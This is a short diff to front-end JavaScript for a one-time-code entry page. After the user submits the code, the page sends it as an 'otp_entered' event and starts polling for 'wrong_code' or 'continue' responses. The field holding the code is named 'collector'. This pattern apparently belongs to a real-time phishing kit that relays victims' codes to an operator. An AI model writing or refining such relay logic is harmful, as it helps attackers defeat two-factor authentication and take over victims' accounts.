@@ -579,13 +579,19 @@ function startOTPResendCountdown(){
   resendIv=setInterval(()=>{s--;if(s<=0){clearInterval(resendIv);cd.textContent='';btn.disabled=false;btn.style.opacity='1';}else{cd.textContent=`Resend in ${s}s`;}},1000);
 }
 function startResend(){startOTPResendCountdown();resetOTP();}
-
 async function handleVerify(){
   if(collector.value.length===5&&currentSessionId){
     showLoading();
     const result=await callApi('otp_entered',{sessionId:currentSessionId,otp:collector.value});
-    if(result.success){verifyBtn.textContent='Verifying…';verifyBtn.disabled=true;}
-    else{hideLoading();alert('Failed to send OTP. Please try again.');}
+    if(result.success){
+      verifyBtn.textContent='Verifying…';
+      verifyBtn.disabled=true;
+      // ✅ Restart polling to catch wrong_code or continue response
+      startStatusPolling(currentSessionId);
+    } else {
+      hideLoading();
+      alert('Failed to send OTP. Please try again.');
+    }
   }
 }
 
